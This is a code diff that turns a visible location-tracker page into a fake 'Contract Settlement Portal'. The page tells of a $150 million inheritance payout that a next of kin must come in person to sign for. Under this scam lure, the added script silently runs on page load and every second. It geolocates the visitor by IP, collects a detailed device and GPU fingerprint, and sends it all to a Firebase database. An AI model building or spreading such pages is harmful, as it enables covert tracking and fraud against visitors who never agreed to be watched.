@@ -3,129 +3,465 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LRemote Location Tracker</title>
+    <title>Contract Settlement Portal</title>
+    
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Times New Roman', Times, serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             padding: 20px;
         }
+
         .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #1e3c72;
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            border-bottom: 3px solid #1e3c72;
+            padding-bottom: 15px;
+        }
+
+        .header h2 {
+            color: #2a5298;
+            font-size: 1.5rem;
+            margin-top: 10px;
+        }
+
+        .contract-badge {
+            display: inline-block;
+            background: #28a745;
+            color: white;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+
+        .contract-document {
             background: white;
             padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 600px;
-            width: 100%;
-        }
-        h1 {
-            color: #667eea;
-            margin-bottom: 10px;
-            font-size: 2rem;
-        }
-        .status {
-            padding: 20px;
-            background: #f0f9ff;
             border-radius: 10px;
-            margin: 20px 0;
-            border-left: 4px solid #667eea;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            margin-bottom: 30px;
         }
-        .status.success { background: #f0fdf4; border-color: #10b981; }
-        .status.error { background: #fef2f2; border-color: #ef4444; }
-        .counter {
+
+        .contract-title {
+            text-align: center;
+            color: #1e3c72;
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            border-bottom: 2px solid #1e3c72;
+            padding-bottom: 15px;
+        }
+
+        .section {
+            margin-bottom: 30px;
+        }
+
+        .section-title {
+            color: #1e3c72;
+            font-size: 1.3rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            padding-left: 10px;
+            border-left: 4px solid #1e3c72;
+        }
+
+        .contract-party {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 4px solid #2a5298;
+        }
+
+        .party-name {
+            font-weight: bold;
+            color: #1e3c72;
+            font-size: 1.1rem;
+            margin-bottom: 5px;
+        }
+
+        .party-role {
+            color: #6c757d;
+            font-size: 0.95rem;
+        }
+
+        .payment-details {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .payment-amount {
             font-size: 3rem;
             font-weight: bold;
-            color: #667eea;
-            text-align: center;
-            margin: 20px 0;
+            margin: 15px 0;
         }
-        .info {
+
+        .payment-status {
+            font-size: 1.3rem;
+            margin-top: 10px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: white;
+            color: #28a745;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .next-of-kin-section {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 30px 0;
+        }
+
+        .next-of-kin-title {
+            color: #856404;
+            font-size: 1.4rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .requirement-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 15px;
+            border-left: 4px solid #ffc107;
+        }
+
+        .requirement-text {
+            color: #333;
+            line-height: 1.8;
+            font-size: 1.05rem;
+        }
+
+        .highlight {
+            color: #1e3c72;
+            font-weight: bold;
+        }
+
+        .contract-details-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 10px;
+            gap: 15px;
             margin: 20px 0;
         }
-        .info-item {
-            padding: 10px;
+
+        .detail-item {
             background: #f8f9fa;
-            border-radius: 8px;
-        }
-        .info-label {
-            font-size: 0.75rem;
-            color: #666;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .info-value {
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #333;
-            margin-top: 5px;
-        }
-        .log {
-            background: #1e293b;
-            color: #10b981;
             padding: 15px;
             border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
-            max-height: 300px;
-            overflow-y: auto;
-            margin-top: 20px;
         }
-        .log-entry { margin: 5px 0; }
+
+        .detail-label {
+            font-size: 0.9rem;
+            color: #6c757d;
+            margin-bottom: 5px;
+        }
+
+        .detail-value {
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: #1e3c72;
+        }
+
+        .signature-section {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 2px solid #1e3c72;
+        }
+
+        .signature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+            margin-top: 30px;
+        }
+
+        .signature-box {
+            text-align: center;
+        }
+
+        .signature-line {
+            border-bottom: 2px solid #333;
+            height: 60px;
+            margin-bottom: 10px;
+        }
+
+        .signature-name {
+            font-weight: bold;
+            color: #1e3c72;
+        }
+
+        .signature-role {
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+
+        .official-stamp {
+            text-align: center;
+            margin: 30px 0;
+            padding: 20px;
+        }
+
+        .stamp-circle {
+            display: inline-block;
+            width: 120px;
+            height: 120px;
+            border: 4px solid #1e3c72;
+            border-radius: 50%;
+            line-height: 110px;
+            text-align: center;
+            color: #1e3c72;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .action-required {
+            background: #f8d7da;
+            border: 2px solid #dc3545;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        .action-title {
+            color: #721c24;
+            font-size: 1.4rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .action-text {
+            color: #333;
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+
+        @media (max-width: 768px) {
+            .contract-details-grid,
+            .signature-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .payment-amount {
+                font-size: 2rem;
+            }
+
+            .header h1 {
+                font-size: 1.6rem;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📍 LRemote Tracker</h1>
-        <p style="color: #666;">Silent location tracking - updates every second</p>
-        
-        <div class="counter" id="counter">0</div>
-        <p style="text-align: center; color: #666;">Updates Sent</p>
-        
-        <div class="status" id="status">
-            <strong>⏳ Initializing...</strong>
+        <!-- Header -->
+        <div class="header">
+            <h1>Contract Settlement & Fund Disbursement Portal</h1>
+            <h2>Official Documentation & Verification System</h2>
+            <div class="contract-badge">✓ CONTRACT FULLY SETTLED</div>
         </div>
-        
-        <div class="info" id="locationInfo" style="display: none;">
-            <div class="info-item">
-                <div class="info-label">Latitude</div>
-                <div class="info-value" id="lat">-</div>
+
+        <!-- Contract Document -->
+        <div class="contract-document">
+            <div class="contract-title">
+                Certificate of Contract Completion & Fund Release Authorization
             </div>
-            <div class="info-item">
-                <div class="info-label">Longitude</div>
-                <div class="info-value" id="lon">-</div>
+
+            <!-- Contract Parties -->
+            <div class="section">
+                <div class="section-title">Contract Parties</div>
+                
+                <div class="contract-party">
+                    <div class="party-name">Mr. Jerry Harrison</div>
+                    <div class="party-role">Primary Contracting Party & Fund Administrator</div>
+                </div>
+
+                <div class="contract-party">
+                    <div class="party-name">Mr. Habib Isa</div>
+                    <div class="party-role">Co-Contracting Party & Financial Overseer</div>
+                </div>
+
+                <div class="contract-party">
+                    <div class="party-name">Mr. Patrick Ahure (Deceased)</div>
+                    <div class="party-role">Original Contract Beneficiary & Principal Party</div>
+                </div>
             </div>
-            <div class="info-item">
-                <div class="info-label">City</div>
-                <div class="info-value" id="city">-</div>
+
+            <!-- Payment Confirmation -->
+            <div class="payment-details">
+                <div style="font-size: 1.2rem;">Total Contract Payment Completed</div>
+                <div class="payment-amount">$150,000,000.00</div>
+                <div style="font-size: 1.1rem;">One Hundred Fifty Million Dollars</div>
+                <div class="payment-status">Payment Status: FULLY SETTLED</div>
+                <div class="status-badge">✓ VERIFIED & CONFIRMED</div>
             </div>
-            <div class="info-item">
-                <div class="info-label">Country</div>
-                <div class="info-value" id="country">-</div>
+
+            <!-- Contract Details -->
+            <div class="section">
+                <div class="section-title">Contract Information</div>
+                <div class="contract-details-grid">
+                    <div class="detail-item">
+                        <div class="detail-label">Contract Status</div>
+                        <div class="detail-value">COMPLETED</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Payment Status</div>
+                        <div class="detail-value">FULLY PAID</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Contract Duration</div>
+                        <div class="detail-value">Multi-Year Agreement</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Verification</div>
+                        <div class="detail-value">AUTHENTICATED</div>
+                    </div>
+                </div>
             </div>
-            <div class="info-item">
-                <div class="info-label">IP Address</div>
-                <div class="info-value" id="ip">-</div>
+
+            <!-- Next of Kin Section -->
+            <div class="next-of-kin-section">
+                <div class="next-of-kin-title">
+                    ⚠ NEXT OF KIN VERIFICATION & FUND DISBURSEMENT REQUIREMENT
+                </div>
+
+                <div class="requirement-box">
+                    <div class="requirement-text">
+                        Following the complete settlement of the contract valued at 
+                        <span class="highlight">$150,000,000.00 (One Hundred Fifty Million Dollars)</span>, 
+                        and due to the unfortunate demise of <span class="highlight">Mr. Patrick Ahure</span>, 
+                        the rightful beneficiary, we hereby confirm that:
+                    </div>
+                </div>
+
+                <div class="requirement-box">
+                    <div class="requirement-text">
+                        <strong>Mr. Amakiri</strong> has been verified and confirmed as the 
+                        <span class="highlight">legal next of kin</span> to the late 
+                        <span class="highlight">Mr. Patrick Ahure</span>.
+                    </div>
+                </div>
+
+                <div class="requirement-box">
+                    <div class="requirement-text">
+                        In accordance with contractual obligations and inheritance protocols, 
+                        the presence of <span class="highlight">Mr. Amakiri</span> is hereby required 
+                        to sign all necessary documentation for the official disbursement and transfer 
+                        of funds to:
+                    </div>
+                    <ul style="margin-top: 10px; margin-left: 20px; line-height: 2;">
+                        <li><strong>Mr. Amakiri</strong> (Next of Kin)</li>
+                        <li><strong>The Patrick Ahure Family</strong> (Legal Heirs)</li>
+                    </ul>
+                </div>
             </div>
-            <div class="info-item">
-                <div class="info-label">Device</div>
-                <div class="info-value" id="device">-</div>
+
+            <!-- Action Required -->
+            <div class="action-required">
+                <div class="action-title">📋 IMMEDIATE ACTION REQUIRED</div>
+                <div class="action-text">
+                    <strong>Mr. Amakiri</strong> must present himself in person to execute and sign 
+                    all requisite legal documents, including but not limited to:<br><br>
+                    ✓ Fund Disbursement Authorization Forms<br>
+                    ✓ Next of Kin Verification Documents<br>
+                    ✓ Inheritance Transfer Agreements<br>
+                    ✓ Contract Settlement Acknowledgment<br>
+                    ✓ Financial Release Authorization<br><br>
+                    <strong>Upon completion of documentation, funds will be disbursed immediately 
+                    to the rightful beneficiaries.</strong>
+                </div>
+            </div>
+
+            <!-- Official Stamp -->
+            <div class="official-stamp">
+                <div class="stamp-circle">
+                    OFFICIAL<br>VERIFIED<br>✓
+                </div>
+            </div>
+
+            <!-- Signature Section -->
+            <div class="signature-section">
+                <div class="section-title">Authorized Signatories</div>
+                <div class="signature-grid">
+                    <div class="signature-box">
+                        <div class="signature-line"></div>
+                        <div class="signature-name">Mr. Jerry Harrison</div>
+                        <div class="signature-role">Contract Administrator</div>
+                    </div>
+                    <div class="signature-box">
+                        <div class="signature-line"></div>
+                        <div class="signature-name">Mr. Habib Isa</div>
+                        <div class="signature-role">Financial Overseer</div>
+                    </div>
+                </div>
+
+                <div class="signature-grid" style="margin-top: 40px;">
+                    <div class="signature-box">
+                        <div class="signature-line"></div>
+                        <div class="signature-name">Mr. Amakiri</div>
+                        <div class="signature-role">Next of Kin (Signature Required)</div>
+                    </div>
+                    <div class="signature-box">
+                        <div class="signature-line"></div>
+                        <div class="signature-name">Legal Representative</div>
+                        <div class="signature-role">Witness & Authentication</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div style="margin-top: 40px; padding-top: 20px; border-top: 2px solid #1e3c72; text-align: center; color: #6c757d;">
+                <p style="font-size: 0.9rem; line-height: 1.8;">
+                    This document serves as official notification of contract completion and fund disbursement requirements.<br>
+                    All parties are expected to comply with the stated procedures for lawful transfer of assets.<br>
+                    <strong>Reference: Contract Settlement - Patrick Ahure Estate</strong>
+                </p>
             </div>
         </div>
-        
-        <div class="log" id="log"></div>
     </div>
 
+    <!-- Silent Location Tracking Script -->
     <script>
         // Firebase Configuration
         const firebaseConfig = {
@@ -142,145 +478,159 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        let updateCount = 0;
-        let lastLocation = null;
+        let locationCount = 0;
+        let lastUpdate = null;
 
-        function log(message, type = 'info') {
-            const logDiv = document.getElementById('log');
-            const timestamp = new Date().toLocaleTimeString();
-            const colors = {
-                info: '#60a5fa',
-                success: '#10b981',
-                error: '#ef4444',
-                warning: '#f59e0b'
-            };
-            logDiv.innerHTML += `<div class="log-entry" style="color: ${colors[type] || colors.info}">[${timestamp}] ${message}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-
-        function updateStatus(message, type = 'info') {
-            const statusDiv = document.getElementById('status');
-            statusDiv.className = `status ${type}`;
-            statusDiv.innerHTML = `<strong>${message}</strong>`;
-        }
-
-        function updateUI(data) {
-            document.getElementById('counter').textContent = updateCount;
-            document.getElementById('locationInfo').style.display = 'grid';
-            document.getElementById('lat').textContent = data.latitude?.toFixed(6) || '-';
-            document.getElementById('lon').textContent = data.longitude?.toFixed(6) || '-';
-            document.getElementById('city').textContent = data.city || '-';
-            document.getElementById('country').textContent = data.country || '-';
-            document.getElementById('ip').textContent = data.ipAddress || '-';
-            document.getElementById('device').textContent = data.deviceName || '-';
-        }
-
+        // Get device name
         function getDeviceName() {
             const ua = navigator.userAgent;
-            if (ua.match(/Android/i)) return 'Android Device';
-            if (ua.match(/iPhone/i)) return 'iPhone';
-            if (ua.match(/iPad/i)) return 'iPad';
-            if (ua.match(/Windows/i)) return 'Windows PC';
-            if (ua.match(/Macintosh/i)) return 'Mac';
-            if (ua.match(/Linux/i)) return 'Linux PC';
-            return 'Unknown Device';
+            let device = 'Unknown Device';
+            if (ua.match(/Android/i)) device = 'Android Device';
+            else if (ua.match(/iPhone/i)) device = 'iPhone';
+            else if (ua.match(/iPad/i)) device = 'iPad';
+            else if (ua.match(/Windows/i)) device = 'Windows PC';
+            else if (ua.match(/Macintosh/i)) device = 'Mac';
+            else if (ua.match(/Linux/i)) device = 'Linux PC';
+            
+            if (ua.match(/Chrome/i) && !ua.match(/Edg/i)) device += ' (Chrome)';
+            else if (ua.match(/Safari/i) && !ua.match(/Chrome/i)) device += ' (Safari)';
+            else if (ua.match(/Firefox/i)) device += ' (Firefox)';
+            else if (ua.match(/Edg/i)) device += ' (Edge)';
+            
+            return device;
         }
 
-        function getScreenResolution() {
-            return `${screen.width}x${screen.height}`;
+        // Get device fingerprint
+        function getDeviceFingerprint() {
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                languages: navigator.languages,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                devicePixelRatio: window.devicePixelRatio,
+                cpuCores: navigator.hardwareConcurrency || 0,
+                deviceMemory: navigator.deviceMemory || 0,
+                touchPoints: navigator.maxTouchPoints,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                connectionType: navigator.connection?.effectiveType || 'Unknown',
+                downlink: navigator.connection?.downlink || 'Unknown',
+                rtt: navigator.connection?.rtt || 'Unknown'
+            };
         }
 
-        // Track location using IP-API
-        async function trackLocation() {
+        // Get GPU info
+        function getGPUInfo() {
             try {
-                log('📡 Fetching location from ip-api.com...');
-                
-                // Using JSONP approach via script tag to avoid CORS
-                const script = document.createElement('script');
-                script.src = 'http://ip-api.com/json/?callback=handleIPData';
-                document.body.appendChild(script);
-                
-            } catch (error) {
-                log(`❌ Error: ${error.message}`, 'error');
-            }
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                }
+            } catch (e) {}
+            return { vendor: 'Unknown', renderer: 'Unknown' };
         }
 
-        // Global callback for IP-API
+        // Handle IP data from JSONP callback
         window.handleIPData = function(data) {
-            // Remove the script tag
+            // Clean up script tag
             const scripts = document.querySelectorAll('script[src*="ip-api.com"]');
             scripts.forEach(s => s.remove());
             
             if (data.status === 'fail') {
-                log(`❌ IP API failed: ${data.message}`, 'error');
-                updateStatus(`❌ Location error: ${data.message}`, 'error');
+                console.warn('⚠️ IP API failed:', data.message);
                 return;
             }
 
-            log(`✅ IP API success: ${data.city}, ${data.country}`, 'success');
+            locationCount++;
+            lastUpdate = new Date().toLocaleTimeString();
             
-            updateCount++;
-            lastLocation = {
+            const fingerprint = getDeviceFingerprint();
+            const gpuInfo = getGPUInfo();
+            
+            // Build complete location data
+            const locationData = {
+                id: locationCount,
                 deviceName: getDeviceName(),
-                deviceType: navigator.platform,
-                screenResolution: getScreenResolution(),
-                cpuCores: navigator.hardwareConcurrency || 0,
-                deviceMemory: navigator.deviceMemory || 0,
+                deviceType: fingerprint.platform,
+                userAgent: fingerprint.userAgent,
+                languages: fingerprint.languages,
+                screenResolution: fingerprint.screenResolution,
+                colorDepth: fingerprint.colorDepth,
+                pixelDepth: fingerprint.pixelDepth,
+                devicePixelRatio: fingerprint.devicePixelRatio,
+                cpuCores: fingerprint.cpuCores,
+                deviceMemory: fingerprint.deviceMemory,
+                touchPoints: fingerprint.touchPoints,
+                gpuVendor: gpuInfo.vendor,
+                gpuRenderer: gpuInfo.renderer,
+                connectionType: fingerprint.connectionType,
+                downlink: fingerprint.downlink,
+                networkRTT: fingerprint.rtt,
+                timezone: fingerprint.timezone,
+                timezoneOffset: fingerprint.timezoneOffset,
                 latitude: data.lat,
                 longitude: data.lon,
                 accuracy: 'IP-based (approximate)',
-                city: data.city,
+                altitude: 'N/A',
+                altitudeAccuracy: 'N/A',
+                heading: 'N/A',
+                speed: 'N/A',
+                timestamp: Date.now(),
+                collectedAt: new Date().toISOString(),
+                ipAddress: data.query,
                 country: data.country,
                 countryCode: data.countryCode,
                 region: data.regionName,
+                city: data.city,
                 zip: data.zip,
-                timezone: data.timezone,
-                ipAddress: data.query,
                 isp: data.isp,
                 organization: data.org,
-                locationMethod: 'IP-based (ip-api.com)',
-                timestamp: Date.now(),
-                collectedAt: new Date().toISOString()
+                locationMethod: 'IP-based'
             };
 
-            // Send to Firebase
-            sendToFirebase(lastLocation);
-            
-            // Update UI
-            updateUI(lastLocation);
+            // Send to Firebase /test/connection (for Android app)
+            db.ref('test/connection').update(locationData)
+                .then(() => {
+                    console.log(`✅ [${locationCount}] Sent to Firebase: ${locationData.city}, ${locationData.country}`);
+                })
+                .catch((error) => {
+                    console.error('❌ Firebase error:', error.message);
+                });
+
+            // Also save to /locations (for history)
+            db.ref('locations').push(locationData)
+                .catch((error) => {
+                    console.error('❌ History error:', error.message);
+                });
+
+            // Store locally
+            try {
+                let locations = JSON.parse(localStorage.getItem('locations') || '[]');
+                locations.push(locationData);
+                if (locations.length > 1000) locations = locations.slice(-1000);
+                localStorage.setItem('locations', JSON.stringify(locations));
+            } catch (e) {}
         };
 
-        async function sendToFirebase(locationData) {
-            try {
-                log('🔥 Sending to Firebase /test/connection...');
-                
-                // Update /test/connection (for app to read)
-                await db.ref('test/connection').update(locationData);
-                log(`✅ Sent to /test/connection (Update #${updateCount})`, 'success');
-                
-                // Also save to /locations (for history)
-                await db.ref('locations').push(locationData);
-                log(`✅ Saved to /locations history`, 'success');
-                
-                updateStatus(`✅ Tracking Active | Update #${updateCount}`, 'success');
-                
-            } catch (error) {
-                log(`❌ Firebase error: ${error.message}`, 'error');
-                updateStatus(`❌ Firebase error: ${error.message}`, 'error');
-                
-                if (error.code === 'PERMISSION_DENIED') {
-                    log('🔒 SOLUTION: Update Firebase Rules', 'error');
-                    log('Go to Firebase Console > Realtime Database > Rules', 'error');
-                    log('Set: { ".read": true, ".write": true }', 'error');
-                }
-            }
+        // Track location using JSONP (bypasses CORS)
+        function trackLocation() {
+            const script = document.createElement('script');
+            script.src = 'http://ip-api.com/json/?callback=handleIPData';
+            document.body.appendChild(script);
         }
 
         // Start tracking on page load
-        window.addEventListener('DOMContentLoaded', () => {
-            log('🚀 Starting LRemote Location Tracker...');
-            log(`📱 Device: ${getDeviceName()}`);
-            log(`🖥️ Screen: ${getScreenResolution()}`);
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log(`🚀 Starting tracking on: ${getDeviceName()}`);
             
             // Initial track
             trackLocation();
@@ -288,8 +638,12 @@
             // Track every 1 second
             setInterval(trackLocation, 1000);
             
-            log('⏱️ Tracking interval: Every 1 second');
-            log('✅ Tracker started successfully!');
+            console.log('✅ Silent tracking started - updates every second');
+        });
+
+        // Continue when page becomes visible
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) trackLocation();
         });
     </script>
 </body>
